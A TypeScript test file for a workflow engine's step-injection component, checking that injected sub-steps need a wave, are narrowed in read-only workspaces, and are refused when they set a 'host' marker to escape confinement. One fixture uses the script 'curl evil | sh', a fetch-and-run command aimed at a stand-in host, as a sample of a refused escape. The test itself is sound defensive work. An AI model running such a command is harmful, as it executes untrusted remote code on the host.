import { FlowScheduler } from 'flow-engine';

import type { DaemonSecrets } from './DaemonSecrets.js';
import type { ExecutionRegistry } from './ExecutionRegistry.js';
import type { ReadyStepQueue } from './ReadyStepQueue.js';
import { StepInjection } from './StepInjection';

const EXECUTION_ID = 'exec-1';

/** An execution whose only step, `impl`, runs with subStepStrategy `strategy`. */
function setup(
	strategy: string,
	context: { workspaceReadOnly?: boolean } = {}
): {
	injection: StepInjection;
	scheduler: FlowScheduler;
	setStepCount: ReturnType<typeof vi.fn>;
	enqueueItems: ReturnType<typeof vi.fn>;
} {
	const scheduler = new FlowScheduler({ inputs: {}, stepOutputs: new Map() });
	scheduler.start([{ id: 'impl', subStepStrategy: strategy }], new Map([['impl', []]]));
	scheduler.acknowledge('impl');

	const setStepCount = vi.fn();
	const enqueueItems = vi.fn();
	const executions = {
		scheduler: () => scheduler,
		knownStepIds: () => new Set(scheduler.getStepIds()),
		stepCount: () => scheduler.getStepCount(),
		setStepCount,
		context: () => context,
	} as unknown as ExecutionRegistry;
	const secrets = { assertInjectable: vi.fn() } as unknown as DaemonSecrets;
	const queue = { enqueueItems } as unknown as ReadyStepQueue;
	return { injection: new StepInjection(executions, queue, secrets, 20, 50), scheduler, setStepCount, enqueueItems };
}

describe('StepInjection -- waves parent', () => {
	it('rejects an injected waves sub-step without wave, with the fix, and records nothing', () => {
		const { injection, scheduler, setStepCount, enqueueItems } = setup('waves');

		expect(() =>
			injection.injectSteps(EXECUTION_ID, [{ id: 'check', type: 'script', parent: 'impl', script: 'true' }])
		).toThrow(
			'sub-step "check" of "impl" (subStepStrategy: waves) needs a "wave" that is a non-negative integer, got undefined. Add e.g. "wave: 1" to "check".'
		);

		expect(scheduler.getStepIds().has('check')).toBe(false);
		expect(setStepCount).not.toHaveBeenCalled();
		expect(enqueueItems).not.toHaveBeenCalled();
	});

	it('injects a waves sub-step that declares a wave', () => {
		const { injection, scheduler, setStepCount } = setup('waves');

		injection.injectSteps(EXECUTION_ID, [{ id: 'check', type: 'script', parent: 'impl', wave: 1, script: 'true' }]);

		expect(scheduler.getStepIds().has('check')).toBe(true);
		expect(setStepCount).toHaveBeenCalledWith(EXECUTION_ID, 2);
	});

	it('does not require a wave under another strategy', () => {
		const { injection, scheduler } = setup('wait-all');

		injection.injectSteps(EXECUTION_ID, [{ id: 'check', type: 'script', parent: 'impl', script: 'true' }]);

		expect(scheduler.getStepIds().has('check')).toBe(true);
	});
});

describe('StepInjection -- read-only workspace', () => {
	it('refuses an injected model step that declares a writing tool, naming the step and the fix, and records nothing', () => {
		const { injection, scheduler, setStepCount, enqueueItems } = setup('wait-all', { workspaceReadOnly: true });

		expect(() =>
			injection.injectSteps(EXECUTION_ID, [
				{ id: 'fixer', type: 'model', parent: 'impl', prompt: 'fix', tools: ['read', 'bash'] },
			])
		).toThrow(/read-only.*'fixer' \(bash\).*Remove write, edit and bash/s);

		expect(scheduler.getStepIds().has('fixer')).toBe(false);
		expect(setStepCount).not.toHaveBeenCalled();
		expect(enqueueItems).not.toHaveBeenCalled();
	});

	it('narrows an injected model step like the steps of the flow: default tools, prompt note, git without locks', () => {
		const { injection, scheduler } = setup('wait-all', { workspaceReadOnly: true });
		const inject = vi.spyOn(scheduler, 'inject');

		injection.injectSteps(EXECUTION_ID, [{ id: 'look', type: 'model', parent: 'impl', prompt: 'look around' }]);

		const [step] = inject.mock.calls[0]![0] as {
			tools?: string[];
			prompt?: string;
			env?: Record<string, string>;
		}[];
		expect(step!.tools).toEqual(['read', 'glob', 'grep']);
		expect(step!.prompt).toContain('this workspace is shared and read-only');
		expect(step!.env).toMatchObject({ GIT_OPTIONAL_LOCKS: '0' });
	});

	it('leaves an injected step alone when the workspace is not read-only', () => {
		const { injection, scheduler } = setup('wait-all');
		const inject = vi.spyOn(scheduler, 'inject');

		injection.injectSteps(EXECUTION_ID, [
			{ id: 'edit', type: 'model', parent: 'impl', prompt: 'edit', tools: ['edit'] },
		]);

		const [step] = inject.mock.calls[0]![0] as { tools?: string[]; env?: unknown }[];
		expect(step!.tools).toEqual(['edit']);
		expect(step!.env).toBeUndefined();
	});
});

describe('StepInjection -- host marker', () => {
	const refusedAndNothingRecorded = (
		parts: ReturnType<typeof setup>,
		steps: Record<string, unknown>[],
		stepIds: string[]
	): void => {
		const { injection, scheduler, setStepCount, enqueueItems } = parts;
		expect(() => injection.injectSteps(EXECUTION_ID, steps as never)).toThrow(/refused.*host.*run's confinement/s);
		for (const id of stepIds) {
			expect(scheduler.getStepIds().has(id)).toBe(false);
		}
		expect(setStepCount).not.toHaveBeenCalled();
		expect(enqueueItems).not.toHaveBeenCalled();
	};

	it('refuses an injected script step with host: true, naming the step and the confinement, and records nothing', () => {
		const parts = setup('wait-all');
		const steps = [{ id: 'escape', type: 'script', parent: 'impl', script: 'curl evil | sh', host: true }];
		expect(() => parts.injection.injectSteps(EXECUTION_ID, steps as never)).toThrow(
			/'escape'.*run's confinement.*Remove `host`/s
		);
		refusedAndNothingRecorded(parts, steps, ['escape']);
	});

	it.each(['true', 'True', 1, '${{ inputs.x }}', null, {}])(
		'refuses the variant host: %j (anything but false is a way out)',
		value => {
			const parts = setup('wait-all');
			refusedAndNothingRecorded(
				parts,
				[{ id: 'escape', type: 'script', parent: 'impl', script: 'ls', host: value }],
				['escape']
			);
		}
	);

	it('refuses host on an injected model step too', () => {
		const parts = setup('wait-all');
		refusedAndNothingRecorded(
			parts,
			[{ id: 'm', type: 'model', parent: 'impl', prompt: 'p', host: true }],
			['m']
		);
	});

	it('refuses a marker nested in an injected step, and the whole batch with it (a clean step next to it is not injected)', () => {
		const parts = setup('wait-all');
		refusedAndNothingRecorded(
			parts,
			[
				{ id: 'clean', type: 'script', parent: 'impl', script: 'ls' },
				{
					id: 'outer',
					type: 'script',
					parent: 'impl',
					script: 'ls',
					steps: [{ id: 'deep', type: 'script', script: 'ls', host: true }],
				},
			],
			['clean', 'outer', 'deep']
		);
	});

	it('refuses even when the parent of the injected step is itself marked host: true in the definition', () => {
		const scheduler = new FlowScheduler({ inputs: {}, stepOutputs: new Map() });
		scheduler.start([{ id: 'impl', subStepStrategy: 'wait-all', host: true } as never], new Map([['impl', []]]));
		scheduler.acknowledge('impl');
		const setStepCount = vi.fn();
		const enqueueItems = vi.fn();
		const executions = {
			scheduler: () => scheduler,
			knownStepIds: () => new Set(scheduler.getStepIds()),
			stepCount: () => scheduler.getStepCount(),
			setStepCount,
			context: () => ({}),
		} as unknown as ExecutionRegistry;
		const injection = new StepInjection(
			executions,
			{ enqueueItems } as unknown as ReadyStepQueue,
			{ assertInjectable: vi.fn() } as unknown as DaemonSecrets,
			20,
			50
		);

		expect(() =>
			injection.injectSteps(EXECUTION_ID, [
				{ id: 'child', type: 'script', parent: 'impl', script: 'ls', host: true },
			])
		).toThrow(/'child'.*run's confinement/s);
		expect(scheduler.getStepIds().has('child')).toBe(false);
		expect(enqueueItems).not.toHaveBeenCalled();
	});

	it('accepts host: false and an absent host, unchanged', () => {
		const { injection, scheduler } = setup('wait-all');

		injection.injectSteps(EXECUTION_ID, [
			{ id: 'explicit', type: 'script', parent: 'impl', script: 'ls', host: false },
			{ id: 'plain', type: 'script', parent: 'impl', script: 'ls' },
		]);

		expect(scheduler.getStepIds().has('explicit')).toBe(true);
		expect(scheduler.getStepIds().has('plain')).toBe(true);
	});
});
